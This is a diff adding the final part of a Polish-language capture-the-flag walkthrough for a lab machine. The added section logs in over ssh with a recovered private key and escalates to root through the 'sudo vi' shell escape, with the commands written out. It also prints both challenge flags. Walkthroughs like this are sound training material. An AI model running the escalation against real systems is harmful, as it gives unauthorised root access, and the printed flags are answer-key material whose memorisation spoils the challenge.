@@ -186,5 +186,60 @@ Po stabilizacji shella możemy przejść do eksploitacji maszyny. W katalogu dom
 
 ![RSA_KEY](img/RSA_KEY.JPG)
 
+Pamiętając o uruchomionej usłudze ssh na porcie 22 spróbujmy się zalogować jako użytkownik charlie. W tym celu stwórzmy plik ,,rsa" zawierający klucz prywatny oraz nadajmy mu uprawnienia komedną:
 
+```
+chmod 600 rsa
+```
 
+Przy użyciu klucza prywatnego zalogujmy się na konto użytkownika charlie:
+
+```
+ssh -i rsa charlie@10.10.108.33
+```
+
+![Charlie](img/Charlie.JPG)
+
+Flaga user.txt:
+
+![User](img/User.JPG)
+
+```
+flag{cd5509042371b34e4826e4838b522d2e}
+```
+
+## Zwiększenie poziomu uprawnień
+
+Za pomocą poniższej komedny sprawdzamy uprawnienia użytkownika charlie w systemie:
+
+```
+
+charlie@chocolate-factory:/home/charlie$ sudo -l
+Matching Defaults entries for charlie on chocolate-factory:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User charlie may run the following commands on chocolate-factory:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+```
+
+Wykorzystajmy fakt, że użytkownik charlie może wykonywac komednę vi jako root:
+
+```
+sudo vi -c ':!/bin/sh' /dev/null
+```
+
+![Vi_Command](img/Vi_Command.JPG)
+
+Uzyskaliśmy właśnie uprawnienia roota. W folderze /root znajduje się program root.py:
+
+![Python](img/Python.JPG)
+
+Program ten używa podanego klucza do odszyfrowania wiadomości. Spróbujmy wykorzystać klucz znaleziony podczas rekonesansu na porcie 113 i odpalić program:
+
+![Root](img/Root.JPG)
+
+Flaga root została zdobyta!
+
+```
+flag{cec59161d338fef787fcb4e296b42124}
+```
